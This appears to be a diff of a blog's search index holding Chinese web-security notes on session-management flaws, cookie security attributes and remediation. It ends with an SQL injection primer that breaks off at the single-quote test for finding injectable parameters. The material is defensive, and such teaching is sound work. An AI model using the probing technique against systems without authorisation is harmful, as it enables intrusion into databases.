@@ -1,21 +1,2398 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>漏洞名称：账号可同时登录</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E8%B4%A6%E5%8F%B7%E5%8F%AF%E5%90%8C%E6%97%B6%E7%99%BB%E5%BD%95/</url>
+    <content><![CDATA[<p>安全性：Medium</p>
+<p>漏洞类型：会话管理</p>
+<p>安全要求：应能对单个账号的重复登录（同一账号同时在不同的终端上登录）进行限制（原则上不超过2个），出现重复登录时，给出明确提示。</p>
+<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>需要解决的四个问题：</p>
+<ul>
+<li>实现在线用户列表</li>
+<li>单个账号在多个终端上进行登录时，进行与用户提示并与退出前一次登录</li>
+<li>关闭浏览器，session失效，该session对应当前登录用户将会从在线列表中移除</li>
+<li>用户正常退出，session失效，该session对应当前登录用户将从在线列表中移除</li>
+</ul>
+<h3 id="0x01-实现思想"><a href="#0x01-实现思想" class="headerlink" title="0x01 实现思想"></a>0x01 实现思想</h3><p>用户登录时，会创建一个session，用于保存用户信息。将所有用户登录时的session值与ID存入ServletContext中，显示在线列表时，就会从ServletContext中取得用户登录的sesson值，从中取得用户信息。</p>
+<ul>
+<li>账号未登录，则第一次登录将用户信息置于用户在线容器列表</li>
+<li>账号已登录，判断是否异地重复登录，重复登录就移除上一次登录，将其失效，把最新登录会话置于用户在线列表中</li>
+</ul>
+<ol>
+<li>登录：先从ServletContext中取出存放用户登录得session相关信息，检查列表，如果已经存在相同得登录信息，则说明用户之前已经登录过，移除前面得记录，再次将此次登录信息加入到ServlertContext中。</li>
+<li>监听：实现SessionListener类，当session失效的时候，从ServletContext中移除相应记录。</li>
+<li>过滤：过滤所有页面，session失效后转向登录页面。但是要实现用户二次登录后强制先前的登录失效，登录时存入的是seesion值与ID值，session值是相同的，但是ID却不相同。</li>
+</ol>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>会话管理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：未启用会话超时功能</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E6%9C%AA%E5%90%AF%E7%94%A8%E4%BC%9A%E8%AF%9D%E8%B6%85%E6%97%B6%E5%8A%9F%E8%83%BD/</url>
+    <content><![CDATA[<p>安全性：中</p>
+<p>漏洞类型：会话管理</p>
+<p>安全要求：具有登录功能的互联网网站及APP应具有会话超时退出机制，系统涉及交易支付和查询，个人信息修改等页面，需重新对用户进行认证且会话超时时间不得大于15分钟，认证方式可选择密码、短信等。</p>
+<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>为了控制攻击者对活动会话的攻击及劫持时间为最小，必须为每个会话设置过期时间。如果Web应用程序的会话过期设置不足，将会增加基于会话的攻击风险，因为攻击者可以重用有效的会话ID并劫持关联的会话。</p>
+<p>会话间隔越短，攻击者能使用有效会话ID的时间就越少。会话过期时间需要根据Web应用程序的目的与特性进行设置，并在安全性和可用性之间取得平衡，保证用户可以轻松的完成Web应用程序的操作，不会频繁因为会话过期而中断操作。空闲时间与过期时间与web应用程序的重要性密切相关，对于高风险应用，常用的闲置时间范围为2-5分钟，而低风险的应用程序则为15-30分钟。当会话到期时，web应用程序必须主动采取措施来使客户端与服务端的会话失效。</p>
+<h3 id="0x01-会话过期方式"><a href="#0x01-会话过期方式" class="headerlink" title="0x01 会话过期方式"></a>0x01 会话过期方式</h3><h4 id="1-1-自动会话超时"><a href="#1-1-自动会话超时" class="headerlink" title="1.1 自动会话超时"></a>1.1 自动会话超时</h4><ul>
+<li><p><strong>空闲超时</strong></p>
+<p>在Web应用程序中，所有会话都应该实现空闲或者不活动超时，此超时定义了会话在没有活动的情况下所保持的时间，即给定的会话ID从接收到最后一个HTTP请求到它失效的这段空闲时间。空闲超时限制了攻击者猜测和使用来自用户的有效会话ID的可能性，但是，如果攻击者已经劫持了给定的会话，则空闲超时不会限制攻击者的行为，因为它可以定期进行会话活动，以使会话保持较长时间的活动状态。如果客户端用于执行会话超时，例如使用会话令牌或其他客户端参数作为时间参数，那么攻击者可以操纵这些参数以延长会话的持续时间，因此会话超时管理必须在服务端进行。</p>
+</li>
+<li><p><strong>绝对超时</strong></p>
+<p>无论会话活动如何，所有绘画都会被实现绝对超时。此超时定义了会话可以处于活动状态的最长时间，从Web应用创建会话开始计时，定义绝对时间段内关闭会话。会话无效后，用户只能在web应用程序中再次进行认证并建立新的会话。绝对会话限制了攻击者可以使用别劫持会话及冒充受害者的时间。</p>
+</li>
+<li><p><strong>更新超时</strong></p>
+<p>Web应用程序可以实现额外的更新超时，实现会话ID的自动更新，它在用户会话有效期期间内独立于会话活动，因此与空闲超时无关。在最初创建的特定时间段之后，web应用程序可以为用户会话重新生成一个新的会话ID，并尝试在客户端上对其进行设置及更新。在客户端知道新ID并开始使用之前，旧的会话ID仍然有效；客户端切换到新ID，应用程序将使先前的ID失效。</p>
+<p>这种机制减少了给定会话ID的使用时间，特别是会话ID被攻击者劫持的时间。如果用户会话在合法的客户端上打开并保持活动，那么每当更新超时到期，会定期更新其关联的会话ID。因此，更新超时补充了空闲超时和绝对超时，特别是绝对超时随着会话时间进行扩展时。</p>
+<p>但这种也存在竞争的情况：攻击者使用先前有效的会话ID在受害者之前发送请求，紧接着更新超时到期，这样攻击者就是先一步的到更新的会话ID值。但这种情况下，用户的会话ID会突然终止，关联的ID会突然失效，至少让用户意识到了自己遭受到了攻击。</p>
+</li>
+</ul>
+<h4 id="1-2-手动会话超时"><a href="#1-2-手动会话超时" class="headerlink" title="1.2 手动会话超时"></a>1.2 手动会话超时</h4><p>​    web应用程序应该提供一种机制，让用户完成完web应用程序后主动关闭会话。 </p>
+<p>​    注销按钮：Web应用程序必须提供一个可见的易于访问的注销按钮，一般时放置程序的头部或菜单上，        并且可以从每个资源或页面上访问，让用户可以在任何时候手动关闭会话。如上所述，Web应用程序必须在    服务端使会话无效。</p>
+<p>​    注：并非每个程序都实现了便于关闭会话的机制，用户可以使用增强功能去注销会话。比如FireFox浏览器的附加组件PopU Logout。</p>
+<h4 id="1-3-网页内容缓存"><a href="#1-3-网页内容缓存" class="headerlink" title="1.3 网页内容缓存"></a>1.3 网页内容缓存</h4><p>会话关闭后可以通过Web浏览器的缓存来访问会话内交换的隐私数据，所以Web应用程序必须对HTTP和HTTPS交换的所有Web流量使用限制缓存指令，如HTTP头或META标签使用Cache-Control:no-cache,no-store和Pragma:no-cache配置。</p>
+<p>如果允许缓存，允许Web客户端缓存除会话ID外的所有内容。</p>
+<h3 id="0x02-思考？"><a href="#0x02-思考？" class="headerlink" title="0x02 思考？"></a>0x02 思考？</h3><p><u>如何实现主动式会话过期提醒？？</u></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>会话管理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：会话固定</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A/</url>
+    <content><![CDATA[<p>安全性：Medium</p>
+<p>漏洞类型：会话管理</p>
+<p>安全要求：用户注销会话后，不能通过使用浏览器的回退按钮来显示</p>
+<h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><ul>
+<li>无状态的HTTP与会话：由于HTTP是无状态的服务，容器为了在同一个用户的不同请求之间保持状态，为每个状态维持一个会话，Servlet容器一般就是HttpSession对象。HTTP客户端每次请求时，都需要把HTTPSession对象的ID(类似JSEESIONID)传递过来，JSEESIONID的传递机制通常是作为URL的一部分或者放置在Cookie中。在第一次请求时，由于没有JSEESIONID，容器会创建一个HTTPSession对象，把它的ID作为JSEESSIONID进行传递，容器中根据这个ID值找到HTTPSession对象。</li>
+<li>登陆与注销前后，如果这个JSESSIONID不会改变，则表示存在会话固定的漏洞。登录前，用户第一次请容器，容器生成一个HttpSession对象，设置JSESSIONID,但这个JSESSIONID是未验证的，如果这个JSEESIONID被恶意用户获取到,那么用户登录后，这个JSEESSIONID变成有效的以后，恶意用户就可以用JSESSIONID来伪冒用户</li>
+</ul>
+<h3 id="0x02-修复建议"><a href="#0x02-修复建议" class="headerlink" title="0x02 修复建议"></a>0x02 修复建议</h3><p>登录成功后作废登录前的会话，注销成功后作废之前的合法会话。</p>
+<p>注销后需要调用HttpSession.invalidate()方法来作废合法的HTTPSession对象，不然会导致内存泄露，因为未注销的httpSession对象只有在超时后才会被回收。</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>会话管理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：会话标识未更新</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E4%BC%9A%E8%AF%9D%E6%A0%87%E8%AF%86%E6%9C%AA%E6%9B%B4%E6%96%B0/</url>
+    <content><![CDATA[<p>安全性：Medium</p>
+<p>漏洞类型：会话管理</p>
+<p>安全要求：用户登录后需要使用新的会话标识，并且会话标识的生成应具有随机性</p>
+<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>会话标识未更新属于中危漏洞，判定条件是根据登录行为前后的Cookie来判断，例会对其中的JSESSIONID(JSP)或ASP.NET_SessionId（ASP）进行记录。在登录行为发生后，如果cookie这个值没有发生变化，则就判定为”会话标识未更新“漏洞。</p>
+<p> 会话标识的泄露、抓取、预测、暴力破解以及会话固定都会导致会话被劫持，导致攻击者可以在web应用中完全模拟受害用户。</p>
+<h3 id="0x01-会话标识属性"><a href="#0x01-会话标识属性" class="headerlink" title="0x01 会话标识属性"></a>0x01 会话标识属性</h3><p>会话标识是一个键值对：name=value，为了保证会话标识的安全性，需要满足以下特性：</p>
+<ul>
+<li><p><strong>会话标识的名称</strong></p>
+<p>会话标识的名称不应该极具描述性，也不应该提供有关ID的用途或含义等不必要的细节。常见的Web应用开发框架的会话ID很容易被识别，如PHP(PHPSESSID)、J2EE(JSESSIONID)、ASP.NET(ASP.NET_SessionId)等，可见会话标识的名称可能会泄露Web应用程序使用的技术和编程语言。因此建议将Web应用开发框架的默认会话ID名称根本更改为通用的名称，如sid。</p>
+</li>
+<li><p><strong>会话标识的长度</strong></p>
+<p>会话标识必须足够长以防止暴力攻击，否则攻击者可以遍历所有ID值并验证是否存在有效会话。一般要求会话标识的长度至少为128位（16字节）</p>
+</li>
+<li><p><strong>会话标识的熵</strong></p>
+<p>会话ID必须是不可预知的，具有足够的随机性，防止被猜测。攻击者可以通过统计分析技术预测有效的会话ID,因此必须使用良好的伪随机数生成器（PRNG)。</p>
+</li>
+<li><p><strong>会话标识的内容</strong></p>
+<p>如果攻击者可以从会话标识中提取用户信息、会话信息或Web应用程序内部的工作细节，那么用于防护信息泄露的会话ID将变得毫无意义。</p>
+<p>会话ID必须是客户端的标识符，其值不得包含敏感信息，同时与会话ID关联的业务及应用的逻辑必须存储在服务端。如果会话对象和属性包含敏感信息，则需要对对话管理存储库进行适当的加密和保护。</p>
+<p>建议使用密码学散列值函数来创建密码学强度的会话ID，如SHA-256。</p>
+</li>
+</ul>
+<h3 id="0x02-会话标识何时更新"><a href="#0x02-会话标识何时更新" class="headerlink" title="0x02 会话标识何时更新"></a>0x02 会话标识何时更新</h3><p>​        对于任何权限更改之处都需要会话标识的更新。用户的认证、权限的更改、密码更改、有常规角色转化成管理员角色等。对于Web应用的关键页面，必须忽略先前的会话ID,每当接收到关键资源的请求时，都需要分配一个新的会话ID,并销毁之前的会话ID。</p>
+<p>​    会话ID的更新能够防止会话固定攻击。身份验证的前后使用不同的会话ID便于Web应用程序追踪所有的用户，同时可以减缓会话ID的泄露与会话ID的固定攻击。</p>
+<h3 id="0x03-检测方式"><a href="#0x03-检测方式" class="headerlink" title="0x03 检测方式"></a>0x03 检测方式</h3><ul>
+<li><p><strong>手工测试</strong></p>
+<p>在Web应用程序登录之前记录会话ID的值，在登录之后记录登录成功后的会话ID,进行比较。</p>
+</li>
+<li><p><strong>Web应用程序漏扫描工具</strong></p>
+<p>AppScan进行Web应用程序的扫描</p>
+<p>AppScan针对“会话ID未更新”的修复方案是</p>
+<p>req.getSession().invalidate();</p>
+<p>Cookie cookie=req.getCookies([0]);</p>
+<p>cookie.setMaxAge(0);</p>
+</li>
+</ul>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>会话管理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：登录信息直接写入cookie</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E7%9B%B4%E6%8E%A5%E5%86%99%E5%85%A5cookie/</url>
+    <content><![CDATA[<p>严重性：Medium</p>
+<p>漏洞类型：会话管理</p>
+<p>安全要求：认证数据加密存储</p>
+<ul>
+<li>用户名及密码尽可能不在客户端存储，若有必要，如cookie中暂存，应以加密方式存储</li>
+<li>密码在服务器或数据库中以摘要值方式存储：使用Hash+Salt，使用SHA2及以上强度的Hash算法</li>
+</ul>
+<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>Cookie，是网站为了辨别用户身份，进行Session追踪而存储在用户本地终端上的数据，由客户端用户暂存或永久保存的信息。cookie是一段不超过4KB的小型文本数据，组成部分Key、Value和其他几个用于控制cookie有效期、安全性、使用范围的可选属性组成。</p>
+<ul>
+<li>Name：设置Cookie的名称及相对应的值</li>
+<li>Value：包括Web服务器提供的访问令牌</li>
+<li>Expires：设置Cookie的周期。分两种：会话性与持久性。Expires属性值缺省时，为会话型Cookie，保存在客户端内存中，并在用户关闭浏览器时失效；持久性Cookie会保存在用户的硬盘中，直至生存期到或用户直接在网页中单击“注销”等按钮结束会话时才会失效。</li>
+<li>Path：定义Web站点上可以访问该Cookie的目录。</li>
+<li>Domain：指定可以访问该Cookie的Web站点或域。</li>
+<li>Secure：指定是否指定使用HTTPS安全协议发送Cookie。如果指定使用HTTPS安全协议可以保护Cookie在浏览器和Web服务器之间的传输不被纂改和窃取。</li>
+<li>HTTPOnly：用于防止客户端脚本通过document.cookie属性访问Cookie,有助于保护Cookie不被跨站脚本脚本攻击窃取或篡改，设置了之后Cookie只能被服务端存取，无法在用户端读取。</li>
+</ul>
+<h3 id="0x01-登录信息加密存储"><a href="#0x01-登录信息加密存储" class="headerlink" title="0x01 登录信息加密存储"></a>0x01 登录信息加密存储</h3><p>盐值是固定长度的具有密码学轻度的随机值，将密码数据附加到盐值中。添加颜值的主要目的如下：</p>
+<ul>
+<li>防止受保护的数据显示为相同的格式，使用盐值增加数据显示的随机性</li>
+<li>增强熵，使存储密码的安全性不依赖密码的复杂度</li>
+</ul>
+<p>密码专用盐(credential-specific salt)需要满足以下条件</p>
+<ul>
+<li>在创建每个存储密码时生成一个特定的盐，而不是对每个用户或系统使用一个特定的盐</li>
+<li>使用满足密码学强度的随机数生成盐，例如SHA2</li>
+<li>方案的安全性不应该依赖隐藏、拆分或其他处理盐的方式</li>
+</ul>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>会话管理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：Session会话退出后不失效</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9ASession%E4%BC%9A%E8%AF%9D%E9%80%80%E5%87%BA%E5%90%8E%E4%B8%8D%E5%A4%B1%E6%95%88/</url>
+    <content><![CDATA[<p>安全性：High</p>
+<p>漏洞类型：会话管理</p>
+<p>安全要求：登录会话在退出后应该失效，手工测试</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>会话管理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：Cookie属性安全</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9ACookie%E5%B1%9E%E6%80%A7%E5%AE%89%E5%85%A8/</url>
+    <content><![CDATA[<p>安全性：Medium</p>
+<p>漏洞类型：会话管理</p>
+<p>安全要求：</p>
+<p>互联网应用应采取措施保证http(https)的会话安全：应保证cookie安全性：如启用HttpOnly属性，使用临时性Cookie取代永久性Cookie，不使用Cookie定制信息，敏感Cookie需加密保存，HTTPS协议下应启用Secure属性。</p>
+<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    基于Cookie的会话ID交换机制以Cookie属性的形式提供了多种安全特性，用于保护会话ID的交换。</p>
+<p>Cookie组成结构一般为：[name][value] [path][domain] [expires][secure] [httponly]</p>
+<p><img src="https://www.ajoshow.com/wp-content/uploads/2.bp_.blogspot.com/1JtL9rG38nI/VpfSwL9-gZI/AAAAAAAAA_w/R6b3UxCO2lU/s640/2016-01-15_005314.png" alt="img"></p>
+<h3 id="0x01-Cookie属性"><a href="#0x01-Cookie属性" class="headerlink" title="0x01 Cookie属性"></a>0x01 Cookie属性</h3><ul>
+<li><p>Secure<strong>属性</strong></p>
+<p>Secure属性指示Web浏览器仅通过加密的HTTPS(SSL/TLS）连接发送Cookie，该会话的保护机制是强制性的，防止通过中间人攻击导致的会话ID泄露，使攻击者不能简单地从网络流量中捕获会话ID。</p>
+<p>如果没有设置安全属性，仅强制Web应用程序使用HTTPS进行访问，并不能防止会话ID的泄露，即使Web应用程序关闭了80端口也是如此。此处攻击者可以诱骗用户使用未加密的链接，从而得到会话ID。例如，攻击者拦截并操作受害者的用户流量，注入Web应用程序的HTTP链接，使得Web浏览器以明文的方式进行提交会话ID。</p>
+<p>例:JAVA中可以通过如下方式在HTTP相应头中设置Secure属性：</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">String sessionid = request.getSession().getId();</span><br><span class="line">response.setHeader(<span class="string">"SET-COOKIE"</span>,<span class="string">"JSEEIONID="</span>+sessionid+<span class="string">";secure"</span>);</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>HttpOnly<strong>属性</strong></p>
+<p>HttpOnly属性指示Web浏览器不允许脚本通过DOM的document.cookie对象访问Cookie，该会话保护机制是强制性的，防止通过XSS攻击窃取会话ID。HttpOnly flag设定时，Cookie只能在服务端存取，无法在用户端读取。</p>
+<p>例：在JAVA中可以通过如下方式在HTTP相应头中设置HttpOnly属性：</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">String sessionid = request.getSession().getId();</span><br><span class="line">response.setHeader(<span class="string">"SET-COOKIE"</span>,<span class="string">"JESSSION="</span>+sessionid+<span class="string">";HttpOnly"</span>)</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>SameSite<strong>属性</strong></p>
+<p>SameSite属性是允许服务器定义的一个Cookie属性，它使浏览器无法将Cookie与跨站点请求一起发送，主要目的是，降低跨域信息泄露的风险，并为跨站请求伪造攻击（CSRF）提供保护。但是目前支持的SameSite的浏览器较少，只有Chrome、Firefox、Opera等少数浏览器。</p>
+<p>其属性值主要包括下面两个值。</p>
+<ul>
+<li><p>Strict。该属性将会阻止浏览器的任何跨域请求发送该Cookie。</p>
+<p>设置方式：Set-Cookie:xxx=xxx;SameSite=Strict。</p>
+</li>
+<li><p>Lax。该属性在可用性与安全性上提供了一种平衡，允许外部链接、预加载请求、GET表单获取用户登录凭证。</p>
+<p>设置方式：Set-Cookie:xxx=xxx;SameSite=Lax。</p>
+<table>
+<thead>
+<tr>
+<th>请求类型</th>
+<th>示例</th>
+<th>正常情况</th>
+<th>Lax</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>链接</td>
+<td><a href="..."></a></td>
+<td>发送Cookie</td>
+<td>发送Cookie</td>
+</tr>
+<tr>
+<td>预加载</td>
+<td><link rel="prerender" href="..."></td>
+<td>发送Cookie</td>
+<td>发送Cookie</td>
+</tr>
+<tr>
+<td>GET表单</td>
+<td><form method="GET" action="..."></form></td>
+<td>发送Cookie</td>
+<td>发送Cookie</td>
+</tr>
+<tr>
+<td>POST</td>
+<td></td>
+<td>发送Cookie</td>
+<td>不发送Cookie</td>
+</tr>
+<tr>
+<td>Iframe</td>
+<td><iframe src="..."></iframe></td>
+<td>发送Cookie</td>
+<td>不发送Cookie</td>
+</tr>
+<tr>
+<td>AJAX</td>
+<td><code>$.get("...")</code></td>
+<td>发送Cookie</td>
+<td>不发送Cookie</td>
+</tr>
+<tr>
+<td>Image</td>
+<td><code>&lt;img src="..."&gt;</code></td>
+<td>发送Cookie</td>
+<td>不发送Cookie</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong>域与路径属性</strong>(Domain and Path Attribute)</p>
+<p>Cookie的域属性指示Web浏览器仅将Cookie发送到指定的域和其所有的子域，如果该属性未设置，Cookie将会被发送到原始域名。路径属性mu指示Web浏览器仅将Cookie发送到Web应用程序指定的目录或子目录（路径或资源），该值默认为根目录/。建议将这两个属性设置在一个比较窄的范围内，即不设置域属性，将Cookie限制在原始域名上，同时设置路径属性，尽可能限制Web应用程序的某些路径对会话ID的使用。</p>
+<ul>
+<li>将域属性设置成过于宽松地值，会导致攻击者对同一域下不同Host的Web应用程序的会话ID发起攻击。</li>
+<li>不要将不同安全级别的Web应用程序混合在同一域中，因为当其中一个Web应用程序存在漏洞时，攻击者就可以通过该漏洞及域属性设置同一域下的其他Web应用程序的会话ID，造成会话ID的泄露。</li>
+</ul>
+<p>Cookie容易受到DNS欺骗或劫持，攻击者可以操纵DNS解析来强制Web浏览器泄露特定Host或域的会话ID。</p>
+</li>
+<li><p><strong>Expire和Max-Age属性</strong></p>
+<p>基于Cookie的会话管理机制可以使用两种类型的Cookie:持久性Cookie和非持久性的Cookie。如果Cookie显示Expires或Max-Age（优先于Expires)属性，则它被视为持久性Cookie，并且Cookie会被存储到磁盘上，直至过期。通常会话管理追踪认证后的用户时使用的是非持久性Cookie，即当前Web浏览器关闭时，前置会话过期。</p>
+<ul>
+<li><p>Expire与Max-Age的区别</p>
+<p>expire:失效时间，表示cookie何时应该被删除的时间戳（也就是何时应该停止向服务器发送这个cookie）。如果不设置时间戳，浏览器会在浏览器关闭时即删除所有cookie;这个值的格式是GMT时间格式。</p>
+<p>max-age:作用和expire是相同的，用来告诉浏览器cookie何时过期，单位是秒，不是一个固定的时间点。</p>
+</li>
+</ul>
+<p>因此建议使用非持久性Cookie进行会话管理，这样会话ID不会长时间保留在Web客户端的缓存中，因而防止攻击者获取会话ID。</p>
+</li>
+</ul>
+<h3 id="0x02-Cookie安全要求"><a href="#0x02-Cookie安全要求" class="headerlink" title="0x02 Cookie安全要求"></a>0x02 Cookie安全要求</h3><ul>
+<li>禁止在Cookie中存放敏感信息</li>
+<li>敏感数据加密防破解</li>
+<li>强制要求开启Secure Flag</li>
+<li>对重要数据强制要求Http only</li>
+</ul>
+</li>
+</ul>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>会话管理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：SQL注入</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9ASQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p><em>【APP服务端安全的注入类检测】</em></p>
+<ul>
+<li><p>对通过系统界面提交的已知的有害输入进行过滤。</p>
+<p>如例如“’”,“–”，“&amp;”，“&lt;”,“&gt;”，“/”，“=”，“#”，“\r\n”，“\n\n”，“；”等字符，防止常见的SQL注入、XSS、等攻击行为</p>
+</li>
+</ul>
+<p><strong>严重性</strong>：高</p>
+<h4 id="一、什么是SQL"><a href="#一、什么是SQL" class="headerlink" title="一、什么是SQL?"></a>一、什么是SQL?</h4><p>​    <strong>SQL</strong>（Structured Query Language:结构化查询语言）是一种特定目的编程语言，用于管理关系数据库管理系统（RDBMS），或在关系流数据库管理系统（RDSMS）中进行流处理。</p>
+<h4 id="二、什么是SQL注入？"><a href="#二、什么是SQL注入？" class="headerlink" title="二、什么是SQL注入？"></a>二、什么是SQL注入？</h4><p>​    <strong>SQL</strong>注入（SQL injection），也称SQL注入或SQL注码，是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库的SQL指令而运行，因此遭到破坏或是入侵。</p>
+<h4 id="三、SQL注入的分类？"><a href="#三、SQL注入的分类？" class="headerlink" title="三、SQL注入的分类？"></a>三、SQL注入的分类？</h4><ul>
+<li>按照参数类型分为两种：数字型、字符型。</li>
+<li>按照数据库返回的结果：回显注入、报错注入、盲注。</li>
+<li>按照注入位置可以分为：post注入、get注入、cookie注入、盲注、延时注入、搜索注入、base64注入</li>
+</ul>
+<h4 id="四、漏洞产生需要的条件"><a href="#四、漏洞产生需要的条件" class="headerlink" title="四、漏洞产生需要的条件"></a>四、漏洞产生需要的条件</h4><ul>
+<li>参数用户可控：前端传给后端的参数内容是用户可以控制的。</li>
+<li>参数带入数据库查询：穿入的参数拼接到SQL语句，且带入数据库查询。</li>
+</ul>
+<h4 id="五、SQL注入带来威胁主要如下"><a href="#五、SQL注入带来威胁主要如下" class="headerlink" title="五、SQL注入带来威胁主要如下"></a>五、SQL注入带来威胁主要如下</h4><ul>
+<li>猜解后台数据库，盗取敏感信息</li>
+<li>绕过认证，如绕过认证登录后台</li>
+<li>借助数据库的存储过程进行提权等操作</li>
+</ul>
+<h4 id="六、判断Sql注入点"><a href="#六、判断Sql注入点" class="headerlink" title="六、判断Sql注入点"></a>六、判断Sql注入点</h4><p>通常情况下，可能存在Sql注入漏洞的Url类似于这形式：<a href="http://xxx.xxx.xxx/abcd.php?id=XX" target="_blank" rel="noopener">http://xxx.xxx.xxx/abcd.php?id=XX</a> 对Sql注入的判断，主要有以下两个方面：</p>
+<ul>
+<li>判断该带参数的Url是否存在Sql注入？</li>
+<li>如果存在Sql注入，其属于哪种Sql注入？</li>
+</ul>
+<p>经典的单引号判断法：在参数后面加上单引号。例：</p>
